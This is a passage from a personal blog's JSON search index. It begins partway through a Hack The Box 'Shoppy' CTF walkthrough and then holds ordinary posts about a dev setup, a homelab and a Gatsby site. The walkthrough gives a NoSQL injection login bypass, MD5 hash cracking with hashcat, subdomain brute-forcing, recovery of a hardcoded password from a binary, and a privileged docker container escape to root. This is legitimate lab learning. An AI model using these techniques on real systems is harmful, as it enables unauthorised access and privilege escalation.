' || 1==1// , I get two users in the download link that shows - http://shoppy.htb/exports/export-search.json: [ {\"_id\":\"62db0e93d6d6a999a66ee67a\",\"username\":\"admin\",\"password\":\"23c6877d9e2b564ef8b32c3a23de27b2\"}, {\"_id\":\"62db0e93d6d6a999a66ee67b\",\"username\":\"josh\",\"password\":\"6ebcea65320589ca4f2f1ce039975995\"} ] After running hashcat against a file containing both MD5 sums: $hashcat -a 0 hashes.txt /usr/share/wordlists/rockyou.txt hashcat (v6.1.1) starting... $hashcat --show hashes.txt 6ebcea65320589ca4f2f1ce039975995:remembermethisway I was unable to SSH into the machine with josh/remembermethisway, and here I got a little stuck.. I reviewed the server, looking for other clues but couldn’t find much. I decided to scan all ports with nmap -sC -sV -oN nmap/all -p- 10.10.11.180, and saw 9093 was an open HTTP server Searching around, it looked like Prometheus go metrics – however there was nothing that appeared particularly useful. I’ll admit that here I ‘cheated’ and checked the HTB discussion thread for this box – and saw people hinting at another subdomain. I noticed when searching for some of the terms in the above prometheus alerts, particularly around playbooks, I saw reference to mattermost: GitHub - mattermost/mattermost-plugin-playbooks: Mattermost Playbooks enable reliable and repeatable processes for your teams using checklists, automation, and retrospectives. With this in mind, I ran a vhost scan in gobuster using SecList DNS lists.. $gobuster vhost -u \"http://shoppy.htb\" -w ~/SecLists/Discovery/DNS/*.txt =============================================================== Gobuster v3.1.0 by OJ Reeves (@TheColonial) \u0026 Christian Mehlmauer (@firefart","date":"2023-01-14","objectID":"/2023-01-14-shoppy-htb/:3:0","tags":["pentesting","security","penetration testing","ctf","docker","reversing"],"title":"Shoppy HTB Walkthrough","uri":"/2023-01-14-shoppy-htb/"},{"categories":null,"content":"Privilege Escalation Checking sudo access, I can run /home/deploy/password-manager, which was mentioned somewhere in the mattermost chat: jaeger@shoppy:~$ sudo -l Matching Defaults entries for jaeger on shoppy: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin User jaeger may run the following commands on shoppy: (deploy) /home/deploy/password-manager Running a `strings /home/deploy/password-manager shows a credentials text file, which I cannot cat myself directly: jaeger@shoppy:~$ strings /home/deploy/password-manager \u003c.. snip ..\u003e Welcome to Josh password manager! Please enter your master password: Access granted! Here is creds ! cat /home/deploy/creds.txt Access denied! This incident will be reported ! jaeger@shoppy:~$ cat /home/deploy/creds.txt cat: /home/deploy/creds.txt: Permission denied jaeger@shoppy:~$ ls -la /home/deploy/creds.txt -rw------- 1 deploy deploy 56 Jul 22 13:15 /home/deploy/creds.txt So I am able to run the password manager, but need the master pass, or to somehow bypass this.. jaeger@shoppy:~$ sudo -u deploy /home/deploy/password-manager Welcome to Josh password manager! Please enter your master password: remembermethisway Access denied! This incident will be reported ! In /home/deploy, there is a password-manager.cpp which we cannot read. This is in line with the mattermost chat where Josh mentions creating a password manager in C++. We have access to the compiled binary, so let’s take a copy to play with locally: scp jaeger@shoppy.htb:/home/deploy/password-manager . jaeger@shoppy.htb's password: password-manager 100% 18KB 454.9KB/s 00:00 Taking a look at the decompiled main function in Ghidra, it looks like we call the += operator in order to concatenate and build a string stored in variable local_68, which we compare to local_48 (which is std::cin – i.e. the standard input stream). So, the app expects “Sample” – let’s try that: jaeger@shoppy:~$ sudo -u deploy /home/deploy/password-manager Welcome to Josh password manager! Please enter your master password: Sample Access granted! Here is creds ! Deploy Creds : username: deploy password: Deploying@pp! I can now ssh into the deploy account, and confirm the password manager logic above based on the c++ source: #include \u003ciostream\u003e #include \u003cstring\u003e int main() { std::cout \u003c\u003c \"Welcome to Josh password manager!\" \u003c\u003c std::endl; std::cout \u003c\u003c \"Please enter your master password: \"; std::string password; std::cin \u003e\u003e password; std::string master_password = \"\"; master_password += \"S\"; master_password += \"a\"; master_password += \"m\"; master_password += \"p\"; master_password += \"l\"; master_password += \"e\"; if (password.compare(master_password) == 0) { std::cout \u003c\u003c \"Access granted! Here is creds !\" \u003c\u003c std::endl; system(\"cat /home/deploy/creds.txt\"); return 0; } else { std::cout \u003c\u003c \"Access denied! This incident will be reported !\" \u003c\u003c std::endl; return 1; } } I tried clobbering cat in $PATH to privesc, when logged in as jaeger and entering the password – but remembered sudoers is set so you cannot preserve the environment, and /home/deploy/password-manager only runs as the deploy user anyway. I then remembered in matter most chat, there was mention of the deploy account being used and it would be deploying via docker.. So, let’s see if we can access docker, if there are any images (HTB boxes do not have internet access, so cannot pull down container images from dockerhub), and if we can run a privileged container to try get root on the host. Docker based privilege escalation is new to me, and not something I have experience with – but I was able to consult the always excellent HackTricks - Docker Breakout / Privilege Escalation - HackTricks Luckily, we have access to an alpine image we can use to spin up a privileged container. Inside the container we run nsenter: $ docker images REPOSITORY TAG IMAGE ID CREATED SIZE alpine latest d7d3d98c851f 5 months ago 5.53MB $ docker run -it --rm --pid=host --privileged alpine /bin/sh ","date":"2023-01-14","objectID":"/2023-01-14-shoppy-htb/:4:0","tags":["pentesting","security","penetration testing","ctf","docker","reversing"],"title":"Shoppy HTB Walkthrough","uri":"/2023-01-14-shoppy-htb/"},{"categories":null,"content":"About emdwyer","date":"2022-05-23","objectID":"/about/","tags":null,"title":"About emdwyer","uri":"/about/"},{"categories":null,"content":"Interests Development (Ruby, React, Javascript) Infosec / CyberSecurity - Penetration Testing, CTF challenges Fitness - Cycling, Running, Strength Training Philosophy Qualifications B. Engineering (Software) PRINCE2 Foundation ITIL Foundation ","date":"2022-05-23","objectID":"/about/:0:0","tags":null,"title":"About emdwyer","uri":"/about/"},{"categories":null,"content":" My current setup The last several months have seen me moving around.. A lot (thanks COVID).. But after hunting around for furniture due to a shortage of standing desks, I’ve finalised my setup – and thank god. ","date":"2021-03-28","objectID":"/2021-03-28-learning-update/:0:0","tags":["development","study","projects"],"title":"My Current Dev Setup and Activity","uri":"/2021-03-28-learning-update/"},{"categories":null,"content":"Setup It’s been great to revive my Ultrawide and laptop in a fairly minimalist setup. This is my primary dev machine which, if you see my GitHub, has caused no end of issues with running Linux (#YearOfTheLinuxDesktop) in the 2 years I’ve had it. My setup from the photo above: HP Zbook x360 G5 2-in-1 laptop running Arch. Screenfetch shows my config: LG 34UC99-W monitor Drop Alt keyboard (Halo Clears for now) Logitech MX Master 2S Mouse A beautiful Marble Queen Pothos for good measure My development is all local, baremetal (for now) with vscode and browser usually tiled on the Ultrawide, and an extra terminal on my laptop display for running tests or other things requiring more screen real estate outside of vscode’s terminal. I’ll most definitely elaborate on my setup more in a future post. ","date":"2021-03-28","objectID":"/2021-03-28-learning-update/:1:0","tags":["development","study","projects"],"title":"My Current Dev Setup and Activity","uri":"/2021-03-28-learning-update/"},{"categories":null,"content":"Studies My focus since moving to Melbourne has been a combination of React, Node, Express, GraphQL and MongoDB - a fairly big change from the last several years I’ve spent on mostly back end Ruby development, surrounding test automation frameworks and CI/CD. Let’s keep in mind I’ve been moving to full stack and not looked at anything web since my degree an embarassing number of years ago. Back then, it was raw HTML, CSS and a bit of jQuery.. And maybe some Bootstrap. My memory is hazy - it was a while ago! Let’s just say I’ve had a lot of catching up to do - UI frameworks, CSS-in-JS frameworks, bundlers, various other tooling.. So, how has my journey looked? FreeCodeCamp FullStackOpen Projects! I initially completed all the FreeCodeCamp certificates, but became a little bored of coding in a browser, and was after something a little more comprehensive and ‘real world’. FullStackOpen filled the gap really nicely. While FreeCodeCamp focuses on JavaScript basics, FullStackOpen was a great way to quickly come up to speed with the JavaScript ecosystem, and learn how to set up React projects, some WebPack, Node \u0026 Express backends and some GraphQL. Oh, and writing unit tests for React components (react-testing-library), and cypress for e2e integration tests? Excellent. Redux? Great! Linting? Awesome! I felt the jumping between projects throughout the course contents and exercises to be a little jarring and confusing at times (and not so obvious), but being able to create a full stack application from end to end, and mocking out certain components yet to be developed was a great way to get up to speed and provided a structured approach from both a bird’s-eye and on-the-ground-running view – a perfect balance. ","date":"2021-03-28","objectID":"/2021-03-28-learning-update/:2:0","tags":["development","study","projects"],"title":"My Current Dev Setup and Activity","uri":"/2021-03-28-learning-update/"},{"categories":null,"content":"Projects I’ve now started up a full stack project - exertion - yet another fitness tracker. I’m also seemingly forever revising this Gatsby site, which I started from scratch. Reinventing the wheel is obviously not the best of ideas, however it’s been a great look into using a static site generator, writing React components, creating my own front end from scatch (this is where I struggle most) and a little GraphQL. A part of me feels using a Gatsby starter would have been wise, but it has been enjoyable and educational coding it all from scratch. The caveat, of course, is that I still have much to do - particularly applying UI design principles around alignment, whitespace, typography etc - in order to add further polish to my site. For me, this is not only continuing to evolve my CSS skills, but also bridging the gap between being identifying if a site’s UI design is aesthetically pleasing or not and understanding why and how it looks great, then subsequently what styling is required to achieve this. ","date":"2021-03-28","objectID":"/2021-03-28-learning-update/:3:0","tags":["development","study","projects"],"title":"My Current Dev Setup and Activity","uri":"/2021-03-28-learning-update/"},{"categories":null,"content":"Next Steps My next steps are to continue my app, and look at Next.js. The tooling, particularly WebPack, has definitely caused a little friction and not provided the best developer experience. I’ve definitely had some fun with WebPack, setting up Babel, getting Jest to work with Babel, etc - so trying out Next.js and some of its features such as code splitting, server side rendering etc looks like a great path forward. ","date":"2021-03-28","objectID":"/2021-03-28-learning-update/:4:0","tags":["development","study","projects"],"title":"My Current Dev Setup and Activity","uri":"/2021-03-28-learning-update/"},{"categories":null,"content":" Cable management - please don't do this. Ever. After relocating around Melbourne multiple times during 2020 (pandemic - long story) and finally settling into my own place with FTTC, I decided it was time to revive the home lab. Previously back in Newcastle, my homelab comprised of: HP MicroServer Gen 8 (running Proxmox) HP ML10v2 (a playground/sandpit host of sorts - jumping between Hyper-V and Proxmox) HP PS1810-8G managed switch Some really crappy, locked all-in-one router device thing from my ISP (I cannot remember the model) After FTTC NBN was finally connected - a drama in itself (another long story) - and after deliberating on Point 4, I decided it made sense to opt for something a little more prosumer grade. I’ve had a longer term interest in homelab tinkering and InfoSec, on top of Development and DevOps things, and simply wanted to Do Things Right™ My ideal setup is the ability to easily create multiple VLANs (which I’ll cover in a future blog), and multiple SSIDs, tagging each with a specific VLAN. This way, I can keep my untrusted IoT devices on their own VLAN with internet access only, and trusted devices (phones, laptops) on a separate VLAN with more freedom. My existing HP MicroServer and ML10V2 run VLAN trunks across the HP switch, and I can readily assign virtual machines to different VLAN IDs, so doing the same for my SSIDs is ideal – again, I’ll cover specifics of my setup later and why I wanted this flexibility. Enter the first upgrade - The Tin Can - otherwise known as the Ubiquiti FlexHD: I originally looked at the UniFi Dream Machine, but the IDS/IPS capabilities seemed somewhat limited, as did the lack of other advanced features. The Unifi AP variants were also considered, but the form factor seemed more suited to mounting on a wall or roof. Besides, who could turn down a wireless access point that resembles a coke can? Next up, after deciding on pfSense as a router/firewall, mostly to play around with IDS/IPS (Suricata) and other packages, I started looking at appliances. The pfSense reddit seems to indicate Protectli and some other pfSense appliances were actually Qotom, Yanling or Minisys mini PCs as found on AliExpress. A quick search on AliExpress for ‘pfsense’ shows many upon many clones of clones of clones of mini PCs with anywhere from 2-6 Intel NICs. I eventually settled on the Topton, a passively cooled mini PC perfectly suited as a router/firewall: Specs: Intel Core i5 8265U (so includes AES-NI) 6 Intel NICs 128 GB SSD 16GB RAM It’s total overkill, but great value for what I paid (around $540 AUD including shipping) for the specs. At this point, I had decided I would virtualise pfSense and pass through a NIC bridged to the NBN FTTC box, given I needed to run the Unifi Network Controller in a separate virtul machine and wasn’t keen on cloud hosted. I think this was the point where I had decided on 16GB RAM, the maximum available at purchase, and 128 GB SSD – with a spare SATA bay for extra storage if required. I would be running this devices as an edge router/firewall, Unifi Network Controller for managing my FlexHD, and with spare resources for any other network appliances I decide on.. In the next part, I’ll cover my basic strategy around configuration, network segmentation, etc. ","date":"2021-03-24","objectID":"/2021-03-24-rebuilding-homelab/:0:0","tags":["homelab","infosec"],"title":"Rebuilding Homelab - Part 1","uri":"/2021-03-24-rebuilding-homelab/"},{"categories":null,"content":" Here it is in its (relative) infancy! Given the current pandemic unfolding, I decided to complete the following on freeCodeCamp to try and increase my productivity (and employment prospects!) while our city has been in and out of lock down: Responsive Web Design Certification JavaScript Algorithms and Data Structures Certification Front End Libraries Certification What this means is, I decided to redo my site using Gatsby, as it seemed to be the static site generator most aligned with React and JavaScript generally, and I was a little curious about GraphQL. Jekyll was fun for a brief moment, but Gatsby seems more aligned with the skills I’m learning and has a fairly comprehensive plugin system. After initially working my way through the tutorials, I did play with some starter Gatsby projects - and it was at this point I decided to reinvent the wheel a little. I’m normally against this (as any developer should be, to a degree), but given my intention to hopefully work in web development at some point, and not having looked at any web development since my university days, I thought developing my own site starting from a blank slate would be a great way to practice and apply some newly learned skills. As such, this is the first project I’ve applied HTML5, CSS3, JS and React to – and any kind of front end development, particularly responsive design. While I’ve worked several technical roles since graduating, including development, none have focused on web development. What does this mean? Strap in for a bumpy ride – plenty of tweaks and improvements to this site, and likely some further technical posts for things I learn and discover along the way that may help others. Oh, and there will be plenty of opportunity for other posts too. I’m currently somewhat obsessed with Productivity (think Getting Things Done) and trying to use technology to its potential, along with develop good habits and establish routines to try and achieve more (much more). I’m sure there will be many topics I can cover in this space. ","date":"2020-07-13","objectID":"/2020-07-13-building-a-site-in-gatsby/:0:0","tags":["development"],"title":"Building a Site in Gatsby","uri":"/2020-07-13-building-a-site-in-gatsby/"},{"categories":null,"content":"Well, here it is. I thought I should attempt to start some platform to rant and share things on, tech related and whatnot. So - here’s my first blog, which I’ll use to share anything related to Linux, development, maybe some fitness and other miscellaneous subjects. Bear with me, as this site also will also serve as a starting point for (re)learning some web development. For the past few years, I’ve largely concentrated on Ruby, C#, some BASH and other scripting – so I’m picking up web again and I’m very rusty! Along the way, I’m hoping to document anything interesting I find. There have been many moments previously where, beyond a git repository, I’ve thought ‘I should probably take note of this somewhere, and share with others’. So, now I have no excuses! A static site generator seemed like my best option, as it’s trivial to register a domain, and link back to Github Pages. I decided to go with Jekyll for the simple reason that it seems simple and straightforward to start with, and I’m already familiar with Ruby. However, I am starting to (re)learn HTML, CSS, Javascript and hoping to pick up Node and React. Eventually, I’d like to try out another static site generator, such as Gatesby. As you have undoubtedly noticed, front end development is not my forte. My background has mostly been backend (some very minor front end web, and Windows Forms applications), so I will be attempting to place a degree of emphasis on this over the coming months, and learning to make things pretty. Obviously I have a long way to go! ","date":"2020-03-30","objectID":"/2020-03-20-first/:0:0","tags":["development"],"title":"First post","uri":"/2020-03-20-first/"}]